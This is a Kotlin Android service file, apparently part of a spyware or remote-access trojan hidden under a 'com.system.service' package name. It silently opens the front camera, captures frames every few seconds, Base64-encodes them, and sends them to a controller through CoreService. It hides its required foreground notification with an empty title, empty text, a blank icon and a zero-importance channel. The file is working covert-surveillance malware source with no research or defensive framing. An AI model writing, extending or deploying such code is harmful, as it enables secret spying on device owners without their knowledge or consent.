package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class CameraStreamService : Service() {

    companion object {
        var isRunning = false
        private const val CHANNEL_ID = "cam_stream"
        private const val NOTIF_ID   = 11
    }

    private val streaming  = AtomicBoolean(false)
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var intervalMs: Long = 2000L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        intervalMs = intent?.getLongExtra("interval", 2000L) ?: 2000L
        isRunning = true
        streaming.set(true)
        startCamera()
        return START_STICKY
    }

    private fun startCamera() {
        thread = HandlerThread("CamStream").apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
        val camId = mgr.cameraIdList.firstOrNull { id ->
            mgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: mgr.cameraIdList.firstOrNull() ?: return

        val map = mgr.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
        val size = map.getOutputSizes(ImageFormat.JPEG)
            .minByOrNull { it.width * it.height } ?: return

        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buf = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                    put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                    put("w", size.width); put("h", size.height)
                })
            } finally { img.close() }
        }, handler)

        try {
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        .apply { addTarget(imageReader!!.surface) }.build()
                    cam.createCaptureSession(listOf(imageReader!!.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s; scheduleCapture(s, req)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {}
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, e: Int) { cam.close() }
            }, handler)
        } catch (_: SecurityException) {}
    }

    private fun scheduleCapture(s: CameraCaptureSession, req: CaptureRequest) {
        if (!streaming.get()) return
        try { s.capture(req, null, handler) } catch (_: Exception) {}
        handler?.postDelayed({ scheduleCapture(s, req) }, intervalMs)
    }

    private fun stopStream() {
        streaming.set(false); isRunning = false
        try { session?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        thread?.quitSafely()
    }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_NONE)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("").setContentText("")
        .setSmallIcon(android.R.drawable.screen_background_dark)
        .build()

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
